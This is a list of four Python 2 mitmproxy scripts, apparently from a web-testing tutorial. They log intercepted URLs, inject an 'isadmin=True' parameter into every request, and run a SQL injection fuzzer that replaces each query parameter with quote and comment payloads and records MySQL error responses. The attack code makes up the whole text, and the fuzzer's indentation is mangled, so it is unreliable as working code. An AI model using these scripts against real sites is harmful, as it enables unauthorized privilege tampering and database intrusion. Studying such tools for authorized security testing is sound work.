["```py\nimport sys\n\ndef request(context, flow):\n  f = open('httplogs.txt', 'a+')\n  f.write(flow.request.url + '\\n') \n  f.close()\n```", "```py\nimport sys\n\nglobal history \nhistory = [] \n\ndef request(context, flow):\n  global history\n  url = flow.request.url\n  if url not in history:\n    f = open('httplogs.txt', 'a+')\n    f.write(flow.request.url + '\\n') \n    f.close()\n    history.append(url)\n  else:\n    pass\n```", "```py\nimport sys\n\ndef request(context, flow):\n  q = flow.request.get_query()\n  if q:\n    q[\"isadmin\"] = [\"True\"]\n    flow.request.set_query(q)\n```", "```py\nimport urlparse\nfrom copy import deepcopy\nimport requests\nimport sys\n\ndef injector (url):\n  errors = ['Mysql','error in your SQL']\n  injections = ['\\'','\\\"',';--']\n  f = open('sqlinjection_results.txt','a+')\n  a = urlparse.urlparse(url)\n  query = a.query.split('&')\n  qlen = len(query)\n  while qlen != 0:\n    querys = deepcopy(query)\n    querys[qlen-1] = querys[qlen-1].split('=')[0] + '=FUZZ' \n    newq='&'.join(querys) \n    url_to_test = a.scheme+'://'+a.netloc+a.path+'?'+newq\n    qlen-=1\n    for inj in injections:\n                  req=requests.get(url_to_test.replace('FUZZ',inj))\n      print req.content\n            for err in errors:\n                          if req.content.find(err) != -1:\n                                        res = req.url + \";\" + err \n                                  f.write(res) \n  f.close()\n\ndef request(context, flow):\n  q = flow.request.get_query()\n  print q\n  if q: \n    injector(flow.request.url)\n    flow.request.set_query(q)\n```"]